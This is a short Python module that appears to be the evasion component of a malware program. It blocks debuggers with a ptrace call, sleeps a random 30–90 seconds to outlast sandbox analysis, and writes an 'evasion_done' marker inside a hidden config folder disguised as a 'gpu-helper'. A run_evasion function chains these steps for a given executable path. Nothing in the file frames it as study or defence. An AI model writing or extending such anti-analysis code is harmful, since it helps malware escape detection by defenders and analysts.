import os
import time
import random
import ctypes


def anti_debug():
    try:
        libc = ctypes.CDLL(None)
        libc.ptrace(0, 0, 0, 0)
    except Exception:
        pass


def delayed_exec():
    delay = random.randint(30, 90)
    time.sleep(delay)


def mark_evasion_done():
    sentinel_path = os.path.join(
        os.path.expanduser("~"), ".config", "gpu-helper", "evasion_done"
    )
    os.makedirs(os.path.dirname(sentinel_path), exist_ok=True)
    try:
        with open(sentinel_path, 'w') as f:
            f.write('1')
        return True
    except Exception:
        return False


def is_evasion_done():
    sentinel_path = os.path.join(
        os.path.expanduser("~"), ".config", "gpu-helper", "evasion_done"
    )
    return os.path.exists(sentinel_path)


def run_evasion(exe_path: str):
    if is_evasion_done():
        return True

    anti_debug()
    delayed_exec()

    mark_evasion_done()
    return True
